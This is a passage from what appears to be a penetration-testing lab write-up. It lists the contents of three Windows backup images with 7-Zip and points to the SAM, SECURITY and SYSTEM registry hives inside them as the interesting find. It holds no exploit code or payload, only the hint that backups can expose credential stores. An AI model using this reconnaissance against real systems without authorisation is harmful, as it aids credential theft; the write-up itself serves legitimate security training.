Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/desktop.ini 2021-05-08 08:14:58 ....A 1281 505 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Administrative Tools.lnk 2021-05-08 08:14:58 ....A 1281 505 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Administrative Tools.lnk 2021-05-08 08:14:58 ....A 1281 505 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Administrative Tools.lnk 2021-05-08 08:14:16 ....A 1142 431 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk 2021-05-08 08:14:16 ....A 1142 431 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk 2021-05-08 08:14:16 ....A 1142 431 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk 2021-05-08 08:14:58 ....A 335 335 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/computer.lnk 2021-05-08 08:14:58 ....A 335 335 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/computer.lnk 2021-05-08 08:14:58 ....A 335 335 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/computer.lnk 2021-05-08 08:14:58 ....A 405 405 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Control Panel.lnk 2021-05-08 08:14:58 ....A 405 405 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Control Panel.lnk 2021-05-08 08:14:58 ....A 405 405 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Control Panel.lnk 2021-05-08 08:18:35 ..HSA 934 463 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Desktop.ini 2021-05-08 08:18:35 ..HSA 934 463 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Desktop.ini 2021-05-08 08:18:35 ..HSA 934 463 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Desktop.ini 2021-05-08 08:14:58 ....A 409 409 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Run.lnk 2021-05-08 08:14:58 ....A 409 409 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Run.lnk 2021-05-08 08:14:58 ....A 409 409 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Run.lnk 2021-05-08 08:18:31 ....A 2539 1068 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk 2021-05-08 08:18:31 ....A 2539 1068 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk 2021-05-08 08:18:31 ....A 2539 1068 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk 2022-03-03 03:57:45 ....A 2539 1040 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk 2022-03-03 03:57:45 ....A 2539 1040 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk 2022-03-03 03:57:45 ....A 2539 1040 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk 2025-02-16 11:10:31 ....A 197085 197085 Administrator/AppData/Roaming/Microsoft/Windows/Themes/CachedFiles/CachedImage_2558_1238_POS4.jpg 2025-02-16 10:51:41 ....A 226489 214803 Administrator/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper 2025-02-16 10:48:48 ..HSA 412 390 Administrator/Contacts/desktop.ini 2025-02-16 10:48:48 ..HSA 282 282 Administrator/Desktop/desktop.ini 2025-02-16 10:48:49 ..HSA 402 383 Administrator/Documents/desktop.ini 2025-02-16 10:48:48 ..HSA 282 282 Administrator/Downloads/desktop.ini 2025-02-16 11:10:30 ....A 208 208 Administrator/Favorites/Bing.url 2025-02-16 10:48:48 ..HSA 402 383 Administrator/Favorites/desktop.ini 2025-02-16 10:48:48 ..HSA 80 80 Administrator/Favorites/Links/desktop.ini 2025-02-16 10:48:49 ..HS. 504 430 Administrator/Links/desktop.ini 2025-02-16 10:48:49 ....A 518 518 Administrator/Links/Desktop.lnk 2025-02-16 10:48:49 ....A 975 761 Administrator/Links/Downloads.lnk 2025-02-16 10:48:48 ..HSA 504 398 Administrator/Music/desktop.ini 2025-02-16 10:48:48 ..HSA 504 396 Administrator/Pictures/desktop.ini 2025-02-16 10:48:49 ..HSA 282 282 Administrator/Saved Games/desktop.ini 2025-02-16 10:48:49 ..HS. 524 425 Administrator/Searches/desktop.ini 2025-02-16 10:48:49 .RH.A 248 248 Administrator/Searches/Everywhere.search-ms 2025-02-16 10:48:49 .RH.A 248 248 Administrator/Searches/Indexed Locations.search-ms 2025-02-16 10:48:48 ..HSA 504 396 Administrator/Videos/desktop.ini 2021-05-08 08:06:51 ..HSA 20480 5560 Default/NTUSER.DAT.LOG2 2025-02-16 11:06:55 ....A 262144 38188 Default/NTUSER.DAT 2025-02-16 19:48:13 ..HSA 65536 1362 Default/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf 2025-02-16 19:48:13 ..HSA 524288 4309 Default/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms 2025-02-16 11:03:32 ....A 64223 20518 Default/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml 2025-02-16 11:03:32 ....A 64223 20518 simon.watson/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml 2021-05-08 08:18:31 ..HSA 440 440 Default/AppData/Roaming/Microsoft/Windows/SendTo/Desktop.ini 2021-05-08 08:18:31 ..HSA 440 440 simon.watson/AppData/Roaming/Microsoft/Windows/SendTo/Desktop.ini 2025-02-16 11:03:34 ..HSA 568 406 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/desktop.ini 2025-02-16 11:03:34 ..HSA 568 406 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/desktop.ini 2021-05-08 08:18:31 ..HSA 170 170 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Desktop.ini 2021-05-08 08:18:31 ..HSA 170 170 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Desktop.ini 2021-05-08 08:18:31 ..HSA 174 174 Public/desktop.ini 2025-02-16 10:48:48 ..HS. 196 196 Public/AccountPictures/desktop.ini 2021-05-08 08:18:31 ..HSA 174 174 Public/Desktop/desktop.ini 2021-05-08 08:18:31 ..HSA 278 278 Public/Documents/desktop.ini 2021-05-08 08:18:31 ..HSA 174 174 Public/Downloads/desktop.ini 2021-05-08 08:18:31 ..HSA 175 175 Public/Libraries/desktop.ini 2021-05-08 08:18:31 ....A 999 672 Public/Libraries/RecordedTV.library-ms 2021-05-08 08:18:31 ..HSA 380 380 Public/Music/desktop.ini 2021-05-08 08:18:31 ..HSA 380 380 Public/Pictures/desktop.ini 2021-05-08 08:18:31 ..HSA 380 380 Public/Videos/desktop.ini 2025-02-16 11:15:52 ..HSA 53248 14393 simon.watson/ntuser.dat.LOG1 2025-02-16 11:15:54 ..HSA 65536 1376 simon.watson/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf 2025-02-16 11:18:25 ..H.A 262144 62035 simon.watson/NTUSER.DAT 2025-02-16 11:15:52 ..HSA 524288 4309 simon.watson/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms 2025-02-16 11:18:25 ..H.A 8192 1358 simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat 2025-02-16 11:15:52 ..HSA 8192 1379 simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1 2025-02-16 11:15:52 ..HSA 16384 1078 simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2 2025-02-16 11:15:54 ..HSA 65536 1448 simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat{29917715-ec57-11ef-9385-000c2945598d}.TM.blf 2025-02-16 11:15:52 ..HSA 524288 4309 simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat{29917715-ec57-11ef-9385-000c2945598d}.TMContainer00000000000000000001.regtrans-ms 2025-02-16 11:18:02 ....A 23652 13197 simon.watson/AppData/Local/Microsoft/Windows/PowerShell/StartupProfileData-Interactive 2025-02-16 11:18:14 ....A 1467 554 simon.watson/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt ------------------- ----- ------------ ------------ ------------------------ 2025-02-16 19:48:13 88021489 9839628 618 files, 886 folders Warnings: 1 </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">AWSJPWK0222-02.wim</code> has a bunch as well, but most interestingly, the registry hives!</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="800"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>7z l AWSJPWK0222-02.wim <span class="go"> 7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024 Scanning the drive for archives: 1 file, 50660968 bytes (49 MiB) Listing archive: AWSJPWK0222-02.wim -- Path = AWSJPWK0222-02.wim Type = wim WARNING = Some files have incorrect reference count Physical Size = 50660968 Size = 227216933 Packed Size = 50650331 Method = XPress:15 Cluster Size = 32768 Created = 2025-02-16 11:23:45.6986518 Modified = 2025-02-16 11:23:45.6986518 Comment = &lt;WIM&gt;&lt;TOTALBYTES&gt;50660130&lt;/TOTALBYTES&gt;&lt;IMAGE INDEX="1"&gt;&lt;DIRCOUNT&gt;43&lt;/DIRCOUNT&gt;&lt;FILECOUNT&gt;86&lt;/FILECOUNT&gt;&lt;TOTALBYTES&gt;229314097&lt;/TOTALBYTES&gt;&lt;HARDLINKBYTES&gt;0&lt;/HARDLINKBYTES&gt;&lt;CREATIONTIME&gt;&lt;HIGHPART&gt;0x01DB8065&lt;/HIGHPART&gt;&lt;LOWPART&gt;0x3DF39196&lt;/LOWPART&gt;&lt;/CREATIONTIME&gt;&lt;LASTMODIFICATIONTIME&gt;&lt;HIGHPART&gt;0x01DB8065&lt;/HIGHPART&gt;&lt;LOWPART&gt;0x3DF39196&lt;/LOWPART&gt;&lt;/LASTMODIFICATIONTIME&gt;&lt;WIMBOOT&gt;0&lt;/WIMBOOT&gt;&lt;NAME&gt;Backup02&lt;/NAME&gt;&lt;/IMAGE&gt;&lt;/WIM&gt; Version = 1.13 Multivolume = - Volume = 1 Volumes = 1 Images = 1 Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2021-05-08 08:20:24 D.... Journal 2025-02-16 19:47:38 D.... RegBack 2021-05-08 08:20:24 D.... systemprofile 2025-02-16 11:06:03 D.... TxR 2021-05-08 08:20:24 D..S. systemprofile/AppData 2025-02-16 10:48:42 D.... systemprofile/AppData/Local 2025-02-16 10:48:12 D.... systemprofile/AppData/LocalLow 2025-02-16 19:47:44 D.... systemprofile/AppData/Roaming 2025-02-16 11:10:47 D.... systemprofile/AppData/Local/D3DSCache 2025-02-16 10:48:44 D.... systemprofile/AppData/Local/Microsoft 2025-02-16 19:47:38 D.... systemprofile/AppData/Local/Packages 2025-02-16 11:06:47 D.... systemprofile/AppData/Local/D3DSCache/5adbeda69f8554f3 2025-02-16 11:10:45 D.... systemprofile/AppData/Local/D3DSCache/90ccb9cba3f45768 2025-02-16 10:52:27 D.... systemprofile/AppData/Local/D3DSCache/c3d1e85f571946f8 2025-02-16 11:10:47 D.... systemprofile/AppData/Local/D3DSCache/f9156d1136660b11 2025-02-16 10:48:34 D..S. systemprofile/AppData/Local/Microsoft/Credentials 2025-02-16 10:48:44 D.... systemprofile/AppData/Local/Microsoft/Vault 2025-02-16 10:49:09 D.... systemprofile/AppData/Local/Microsoft/Windows 2025-02-16 10:48:44 D.... systemprofile/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28 2025-02-16 10:49:09 D.... systemprofile/AppData/Local/Microsoft/Windows/0 2025-02-16 10:49:09 D.... systemprofile/AppData/Local/Microsoft/Windows/1033 2025-02-16 10:49:10 D.... systemprofile/AppData/Local/Microsoft/Windows/Caches 2025-02-16 19:47:38 D.... systemprofile/AppData/Local/Microsoft/Windows/CloudAPCache 2025-02-16 19:47:38 D.... systemprofile/AppData/Local/Microsoft/Windows/CloudAPCache/MicrosoftAccount 2025-02-16 19:47:38 D.... systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost 2025-02-16 19:47:38 D.... systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost/AC 2025-02-16 19:47:38 D.HS. systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost/AC/INetCache 2025-02-16 19:47:38 D.HS. systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost/AC/INetCookies 2025-02-16 19:47:38 D.HS. systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost/AC/INetHistory 2025-02-16 19:47:38 D.... systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost/AC/Temp 2025-02-16 10:48:12 D..S. systemprofile/AppData/LocalLow/Microsoft 2025-02-16 10:48:12 D..S. systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache 2025-02-16 10:48:59 D..S. systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content 2025-02-16 10:48:59 D..S. systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData 2025-02-16 10:48:44 D..S. systemprofile/AppData/Roaming/Microsoft 2025-02-16 19:47:55 D.... systemprofile/AppData/Roaming/Microsoft/Internet Explorer 2025-02-16 19:47:44 D..S. systemprofile/AppData/Roaming/Microsoft/SystemCertificates 2025-02-16 10:48:44 D.... systemprofile/AppData/Roaming/Microsoft/Vault 2025-02-16 10:48:11 D.... systemprofile/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch 2025-02-16 19:47:44 D..S. systemprofile/AppData/Roaming/Microsoft/SystemCertificates/My 2025-02-16 19:47:44 D..S. systemprofile/AppData/Roaming/Microsoft/SystemCertificates/My/Certificates 2025-02-16 19:47:44 D..S. systemprofile/AppData/Roaming/Microsoft/SystemCertificates/My/CRLs 2025-02-16 19:47:44 D..S. systemprofile/AppData/Roaming/Microsoft/SystemCertificates/My/CTLs 2021-05-08 08:06:52 ..HSA 0 0 ELAM.LOG2 2021-05-08 08:06:51 ..HSA 0 0 SECURITY.LOG2 2021-05-08 08:06:51 ..HSA 0 0 SOFTWARE.LOG1 2021-05-08 08:06:51 ..HSA 0 0 SYSTEM.LOG1 2021-05-08 08:06:51 ..HSA 0 0 SYSTEM.LOG2 2025-02-16 19:47:38 ....A 0 0 RegBack/DEFAULT 2025-02-16 19:47:38 ....A 0 0 RegBack/SAM 2025-02-16 19:47:38 ....A 0 0 RegBack/SECURITY 2025-02-16 19:47:38 ....A 0 0 RegBack/SOFTWARE 2025-02-16 19:47:38 ....A 0 0 RegBack/SYSTEM 2025-02-16 10:48:59 ...SA 0 0 systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/77EC63BDA74BD0D0E0426DC8F8008506 2025-02-16 19:47:44 ...SA 0 0 systemprofile/AppData/Roaming/Microsoft/SystemCertificates/My/AppContainerUserCertRead 2025-02-16 11:16:08 ....A 32768 4888 BBI 2021-05-08 08:06:52 ..HSA 40960 7329 BBI.LOG1 2021-05-08 08:06:52 ..HSA 40960 7452 BBI.LOG2 2021-05-08 08:06:52 ..HSA 65536 1462 BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TM.blf 2021-05-08 08:06:52 ..HSA 524288 4311 BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms 2025-02-16 19:47:13 ....A 28672 5340 BCD-Template 2021-05-08 08:06:52 ..HSA 524288 4268 BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms 2025-02-16 19:47:43 ..HSA 524288 4268 COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms 2025-02-16 19:47:38 ..HSA 524288 4268 DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms 2025-02-16 19:47:55 ..HSA 524288 4268 ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms 2025-02-16 19:47:38 ..HSA 524288 4268 TxR/{c76cbc7f-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms 2025-02-16 19:47:13 ..HSA 28672 5365 BCD-Template.LOG 2021-05-08 08:06:51 ..HSA 589824 157523 COMPONENTS.LOG1 2021-05-08 08:06:51 ..HSA 11575296 2182415 COMPONENTS.LOG2 2025-02-16 11:16:28 ..HSA 65536 1398 COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TM.blf 2025-02-16 11:16:28 ..HSA 524288 23651 COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms 2025-02-16 11:16:08 ....A 262144 51307 DEFAULT 2021-05-08 08:06:51 ..HSA 98304 25734 DEFAULT.LOG1 2021-05-08 08:06:51 ..HSA 90112 13951 DEFAULT.LOG2 2025-02-16 11:09:18 ....A 3473408 660661 DRIVERS 2021-05-08 08:06:51 ..HSA 475136 118269 DRIVERS.LOG1 2021-05-08 08:06:51 ..HSA 208896 53640 DRIVERS.LOG2 2025-02-16 11:06:24 ..HSA 65536 1388 DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TM.blf 2025-02-16 11:06:24 ..HSA 524288 4784 DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms 2025-02-16 10:55:40 ....A 32768 6555 ELAM 2021-05-08 08:06:52 ..HSA 32768 6584 ELAM.LOG1 2025-02-16 19:47:55 ..HSA 65536 1372 ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TM.blf 2025-02-16 19:47:55 ..HSA 524288 4309 ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms 2025-02-16 11:16:22 ....A 120 120 netlogon.ftl 2025-02-16 11:16:08 ....A 65536 14320 SAM 2021-05-08 08:06:51 ..HSA 65536 9960 SAM.LOG1 2021-05-08 08:06:51 ..HSA 49152 9502 SAM.LOG2 2025-02-16 11:16:08 ....A 32768 7479 SECURITY 2021-05-08 08:06:51 ..HSA 68608 6717 SECURITY.LOG1 2025-02-16 11:18:47 ....A 64225280 18081618 COMPONENTS 2021-05-08 08:06:51 ..HSA 5996544 979171 SOFTWARE.LOG2 2025-02-16 11:16:08 ....A 17039360 3632062 SYSTEM 2025-02-16 11:06:47 ....A 65552 601 systemprofile/AppData/Local/D3DSCache/5adbeda69f8554f3/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.idx 2025-02-16 11:06:47 ....A 4 4 systemprofile/AppData/Local/D3DSCache/5adbeda69f8554f3/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.lock 2025-02-16 11:16:29 ....A 4 4 systemprofile/AppData/Local/D3DSCache/90ccb9cba3f45768/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.lock 2025-02-16 10:52:27 ....A 4 4 systemprofile/AppData/Local/D3DSCache/c3d1e85f571946f8/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.lock 2025-02-16 11:10:47 ....A 4 4 systemprofile/AppData/Local/D3DSCache/f9156d1136660b11/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.lock 2025-02-16 11:06:47 ....A 976 373 systemprofile/AppData/Local/D3DSCache/5adbeda69f8554f3/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.val 2025-02-16 11:16:29 ....A 65552 601 systemprofile/AppData/Local/D3DSCache/90ccb9cba3f45768/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.idx 2025-02-16 11:16:29 ....A 976 369 systemprofile/AppData/Local/D3DSCache/90ccb9cba3f45768/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.val 2025-02-16 10:52:27 ....A 65552 601 systemprofile/AppData/Local/D3DSCache/c3d1e85f571946f8/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.idx 2025-02-16 10:52:27 ....A 960 363 systemprofile/AppData/Local/D3DSCache/c3d1e85f571946f8/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.val 2025-02-16 11:10:47 ....A 65552 601 systemprofile/AppData/Local/D3DSCache/f9156d1136660b11/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.idx 2025-02-16 11:10:47 ....A 960 365 systemprofile/AppData/Local/D3DSCache/f9156d1136660b11/F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.val 2025-02-16 10:48:34 ..HSA 11136 11136 systemprofile/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D 2025-02-16 10:48:44 ....A 180 180 systemprofile/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28/1D4350A3-330D-4AF9-B3FF-A927A45998AC.vsch 2025-02-16 10:48:44 ....A 436 436 systemprofile/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28/Policy.vpol 2025-02-16 10:49:09 ....A 424337 125879 systemprofile/AppData/Local/Microsoft/Windows/1033/StructuredQuerySchema.bin 2025-02-16 10:49:09 ....A 16384 1003 systemprofile/AppData/Local/Microsoft/Windows/Caches/cversions.3.db 2025-02-16 10:49:10 ....A 424376 125907 systemprofile/AppData/Local/Microsoft/Windows/Caches/{17A6A947-B905-4D30-88C9-B63C603DA134}.3.ver0x0000000000000001.db 2025-02-16 10:48:12 ...SA 4761 4761 systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/57C8EDB95DF3F0AD4EE2DC2B8CFD4157 2025-02-16 10:48:27 ...SA 471 471 systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/7423F88C7F265F0DEFC08EA88C3BDE45_AA1E8580D4EBC816148CE81268683776 2025-02-16 10:50:01 ...SA 7796 7796 systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/FB0D848F74F70BB2EAA93746D24D9749 2025-02-16 10:48:59 ...SA 340 340 systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/57C8EDB95DF3F0AD4EE2DC2B8CFD4157 2025-02-16 10:50:01 ...SA 404 404 systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/7423F88C7F265F0DEFC08EA88C3BDE45_AA1E8580D4EBC816148CE81268683776 2025-02-16 10:52:29 ...SA 290 290 systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/77EC63BDA74BD0D0E0426DC8F8008506 2025-02-16 10:52:29 ...SA 330 330 systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/FB0D848F74F70BB2EAA93746D24D9749 2025-02-16 10:57:52 ....A 2272 946 systemprofile/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Microsoft Edge.lnk 2025-02-16 11:06:24 ..HSA 5242880 665376 TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.0.regtrans-ms 2025-02-16 11:06:24 ..HSA 5242880 583966 TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.1.regtrans-ms 2025-02-16 11:06:24 ..HSA 5242880 631119 TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.2.regtrans-ms 2025-02-16 11:06:24 ..HSA 5242880 699727 TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.3.regtrans-ms 2025-02-16 11:06:24 ..HSA 5242880 644147 TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.4.regtrans-ms 2025-02-16 11:06:24 ..HSA 5242880 565625 TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.5.regtrans-ms 2025-02-16 11:16:08 ..HSA 5242880 558369 TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.6.regtrans-ms 2025-02-16 11:16:08 ..HSA 65536 1621 TxR/{c76cbc7e-afc9-11eb-8234-000d3aa6d50e}.TxR.blf 2025-02-16 11:16:08 ..HSA 65536 1308 TxR/{c76cbc7f-afc9-11eb-8234-000d3aa6d50e}.TM.blf 2025-02-16 11:16:08 ..HSA 524288 22718 TxR/{c76cbc7f-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms 2025-02-16 11:16:08 ....A 81264640 19897693 SOFTWARE ------------------- ----- ------------ ------------ ------------------------ 2025-02-16 19:47:55 229314097 50667415 86 files, 43 folders Warnings: 1 </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">AWSJPWK0222-03.wim</code> looks like some kind of recovery disk:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="500"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>7z l AWSJPWK0222-03.wim <span class="go"> 7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024 Scanning the drive for archives: 1 file, 32065850 bytes (31 MiB) Listing archive: AWSJPWK0222-03.wim -- Path = AWSJPWK0222-03.wim Type = wim Physical Size = 32065850 Size = 68844676 Packed Size = 32037451 Method = XPress:15 Cluster Size = 32768 Created = 2025-02-16 11:23:47.8540971 Modified = 2025-02-16 11:23:47.8540971 Comment = &lt;WIM&gt;&lt;TOTALBYTES&gt;32065010&lt;/TOTALBYTES&gt;&lt;IMAGE INDEX="1"&gt;&lt;DIRCOUNT&gt;125&lt;/DIRCOUNT&gt;&lt;FILECOUNT&gt;295&lt;/FILECOUNT&gt;&lt;TOTALBYTES&gt;72014980&lt;/TOTALBYTES&gt;&lt;HARDLINKBYTES&gt;0&lt;/HARDLINKBYTES&gt;&lt;CREATIONTIME&gt;&lt;HIGHPART&gt;0x01DB8065&lt;/HIGHPART&gt;&lt;LOWPART&gt;0x3F3C76AB&lt;/LOWPART&gt;&lt;/CREATIONTIME&gt;&lt;LASTMODIFICATIONTIME&gt;&lt;HIGHPART&gt;0x01DB8065&lt;/HIGHPART&gt;&lt;LOWPART&gt;0x3F3C76AB&lt;/LOWPART&gt;&lt;/LASTMODIFICATIONTIME&gt;&lt;WIMBOOT&gt;0&lt;/WIMBOOT&gt;&lt;NAME&gt;Backup03&lt;/NAME&gt;&lt;/IMAGE&gt;&lt;/WIM&gt; Version = 1.13 Multivolume = - Volume = 1 Volumes = 1 Images = 1 Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2021-05-08 08:20:24 D.... DVD 2025-02-16 11:05:48 D.... DVD_EX 2025-02-16 11:05:50 D.... EFI 2025-02-16 11:05:48 D.... EFI_EX 2025-02-16 11:05:50 D.... Fonts 2025-02-16 11:05:50 D.... Fonts_EX 2021-05-08 08:20:24 D.... Misc 2025-02-16 11:05:48 D.... PCAT 2021-05-08 09:35:26 D.... Resources 2025-02-16 11:05:50 D.... DVD/EFI 2025-02-16 11:05:50 D.... DVD/PCAT 2025-02-16 11:05:50 D.... DVD/EFI/en-US 2025-02-16 11:05:50 D.... DVD/PCAT/en-US 2025-02-16 11:05:48 D.... DVD_EX/EFI 2025-02-16 11:05:50 D.... DVD_EX/EFI/en-US 2025-02-16 11:05:50 D.... EFI/bg-BG 2025-02-16 11:05:50 D.... EFI/cs-CZ 2025-02-16 11:05:50 D.... EFI/da-DK 2025-02-16 11:05:50 D.... EFI/de-DE 2025-02-16 11:05:50 D.... EFI/el-GR 2025-02-16 11:05:50 D.... EFI/en-GB 2025-02-16 11:05:50 D.... EFI/en-US 2025-02-16 11:05:50 D.... EFI/es-ES 2025-02-16 11:05:50 D.... EFI/es-MX 2025-02-16 11:05:50 D.... EFI/et-EE 2025-02-16 11:05:50 D.... EFI/fi-FI 2025-02-16 11:05:50 D.... EFI/fr-CA 2025-02-16 11:05:50 D.... EFI/fr-FR 2025-02-16 11:05:50 D.... EFI/hr-HR 2025-02-16 11:05:50 D.... EFI/hu-HU 2025-02-16 11:05:50 D.... EFI/it-IT 2025-02-16 11:05:50 D.... EFI/ja-JP 2025-02-16 11:05:50 D.... EFI/ko-KR 2025-02-16 11:05:50 D.... EFI/lt-LT 2025-02-16 11:05:50 D.... EFI/lv-LV 2025-02-16 11:05:50 D.... EFI/nb-NO 2025-02-16 11:05:50 D.... EFI/nl-NL 2025-02-16 11:05:50 D.... EFI/pl-PL 2025-02-16 11:05:50 D.... EFI/pt-BR 2025-02-16 11:05:50 D.... EFI/pt-PT 2021-05-08 08:20:26 D.... EFI/qps-ploc 2025-02-16 11:05:50 D.... EFI/ro-RO 2025-02-16 11:05:50 D.... EFI/ru-RU 2025-02-16 11:05:50 D.... EFI/sk-SK 2025-02-16 11:05:50 D.... EFI/sl-SI 2025-02-16 11:05:50 D.... EFI/sr-Latn-RS 2025-02-16 11:05:50 D.... EFI/sv-SE 2025-02-16 11:05:50 D.... 